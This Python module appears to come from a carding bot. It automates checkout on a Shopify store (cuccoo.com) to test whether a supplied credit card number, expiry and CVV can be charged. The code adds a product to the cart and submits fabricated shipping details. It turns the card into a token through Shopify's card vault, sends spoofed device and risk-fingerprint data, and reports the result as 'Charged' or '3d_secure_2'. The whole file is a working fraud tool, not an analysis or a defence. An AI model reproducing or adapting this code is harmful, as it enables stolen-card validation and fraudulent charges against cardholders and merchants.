from all.configs._def_main_ import *

@retry(stop=stop_after_attempt(3))
async def auto_sho_async(cc, mes, ano, cvv):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)


    async with aiohttp.ClientSession(connector=conn) as session:

        payload_1 = {
            'id': '45339626799263'
        }

        req1 = await session.post(url=f'https://cuccoo.com/cart/add', data=payload_1, timeout=aiohttp.ClientTimeout(total=5))

        req3 = await session.get(url=f"https://cuccoo.com/checkout", timeout=aiohttp.ClientTimeout(total=5))

        checkout_url = req3.url

        print(Fore.GREEN +
              f"[ ꑭ ] URL CHECKOUT: {checkout_url}" + Fore.RESET)

        authenticity_token = get_random_string(86)

        headers = {

            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'

        }

        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=sylphiette%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Battributes%5D%5BCPF+Number%5D=&checkout%5Bshipping_address%5D%5Bfirst_name%5D=syhplhiette&checkout%5Bshipping_address%5D%5Blast_name%5D=greyrat&checkout%5Bshipping_address%5D%5Baddress1%5D=32+Allen+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10002&checkout%5Bshipping_address%5D%5Bphone%5D=2516781923&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22cuccoo%22%2C%22siteName%22%3A%22CUCCOO%22%2C%22siteId%22%3A%2233%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%2272342c30-623d-4cf6-84d7-96fe6533d185%22%2C%22fbp%22%3A%22fb.1.1714893594450.1699951543%22%7D%7D&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1349&checkout%5Bclient_details%5D%5Bbrowser_height%5D=679&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'
        
        req4 = await session.post(url=checkout_url, headers=headers, data=payload_2, timeout=aiohttp.ClientTimeout(total=5))

        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-FLAT%2520RATE%2520SHIPPING-6.95&checkout%5Battributes%5D%5BdeviceCode%5D=%7B%22billno%22%3A%22%22%2C%22scene%22%3A%222%22%2C%22siteFrom%22%3A%22cuccoo%22%2C%22siteName%22%3A%22CUCCOO%22%2C%22siteId%22%3A%2233%22%2C%22deviceCodes%22%3A%7B%22cookie_id%22%3A%2272342c30-623d-4cf6-84d7-96fe6533d185%22%2C%22fbp%22%3A%22fb.1.1714893594450.1699951543%22%7D%7D&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=679&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360'
        
        req5 = await session.post(url=checkout_url, headers=headers, data=payload_3, timeout=aiohttp.ClientTimeout(total=5))

        payload_4 = {
            "credit_card": {
                "number": f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                "name": "Sylphiette Idk",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": "www.cuccoo.com"
        }

        req6 = await session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4, timeout=aiohttp.ClientTimeout(total=5))

        token = await req6.json()

        id_ = token.get('id')

        print(Fore.GREEN +
              f"[ ꑭ ] TOKEN ID: {id_}" + Fore.RESET)

        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=76680102047&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=1955&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=679&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360&checkout%5Battributes%5D%5BriskInfo%5D=%7B%22sm_device_id%22%3A%22Wlsel6H6wYo01qmMfiqt8S%2B9a7JJtiWfInswYZHoACl8FhqR3JxB0DwZis5KviwN%2BzZrq9OJ4D0AGw%2BC9pZ8W5spQFfKfprzKhB%2F4dC6td2%2BekLHAPL6%2BupJqayeVi3pJamrs87e4r4rs6sCZUBFYrz9lM%2FsxYZSSkI20qmzK0YmgUrxybS4cgI0U0hhX7pudWfYmHDK2cYfxcOe1B%2FFj8%2BICaWr1tU4lrguD6NRa%2BrKE2qUAgue4i1sr4TmbHEQBhZvSd9cpz1I%3D1487577677129%22%2C%22anti_in%22%3A%220_1.1.0-shopify_5689a7_6U_AGcjamV-3vW1HDzDQz88ES8wMkVW_EW1rGghb7Yl6HJbTDS_2SKlBo5EB0CvHN_bKX6xC8XoMPc0ih7UBMcTFdfghrvn0mUdYEaSB9Qg_kmqOg7Mi9CQIswUruSkxJJzok5HEhlsH5PqWKyWYlzJDGTqh0soXBrFB6OBIcoOBnaKLNuiDJYRcH5LBL3xoNPwOSUhxeVPHi53wMeVDfZBRMJTCHMymidwplsc4YJNWILrCSYB0rYuWk_q1P9i_V1tcuBj1DxKBD-NnLezojR9X5s_VemrfXPrHw-7uOfvtJeHK_TnM-jS6XLDj8-QnCvNypTARARnMpPc3GjkUqCnJBYeW8R4oRHHO2GcuGpP1La9NPsSWxACS6fXUT-886cUzhxdL1VJSLciN2818LpEdRLjRKfl48jOGJG2DIEgWXw9BmOWhjU9m_5AgNQL62NEFAb3OnJAQzpf-2PnPP2ZmKU0Oftwz0pqreRedFbB-jP4sKFMpMfGGqNr82jeLpqZhin9eVn2N6fKbQ9tqWu9KltPxa8iKhRnSttSVrit4Vap2MbJlGNHhk6zXWGd8vpGPxkslRsowPAgU31McacjylxDmbCTZTBQ-0O9ylyim6OMd8at63NbxqUNJ7uoO25r9ioD-f5PlvkKZtBs0gvStKqe5_bMnePXg-hR48-GBSQQq7MWOr7xfexkridrNXlFHzRopJagoPBDM4GE48R-_7QrEC6xQxhH1LxQ4m3-5tqqSrNbpnRQTv35B4QFAx7MVf5GnVqBFyK_sbTJI2w%22%2C%22channel%22%3A0%2C%22browser_mode%22%3A%22Chrome%22%2C%22browser_versions%22%3A%22124.0.0.0%22%2C%22device_system_version%22%3A%22Windows+10%22%2C%22risk_id%22%3A%2299e2ceb5-a454-4be2-8325-b92bd39efaae%22%2C%22biz_id%22%3A%22cuccoo-cuccoo3317148937689301nGJiB%22%7D'
        
        req7 = await session.post(url=checkout_url, headers=headers, data=payload_5, timeout=aiohttp.ClientTimeout(total=8))

        await asyncio.sleep(5)

        processing_url = req7.url

        print(Fore.GREEN +
              f"[ ꑭ ] URL PROCESADA: {processing_url}" + Fore.RESET)

        req8 = await session.get(str(processing_url) + '?from_processing_page=1', timeout=aiohttp.ClientTimeout(total=5))

        await asyncio.sleep(5)

        req9 = await session.get(req8.url, timeout=aiohttp.ClientTimeout(total=5))

        text_resp = await req9.text()

        resp = find_between(text_resp, 'notice__text">', '<')

        if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):

            resp = 'Charged'

        elif '/3d_secure_2/' in str(req9.url):

            resp = '3d_secure_2'

        print(resp)

        return resp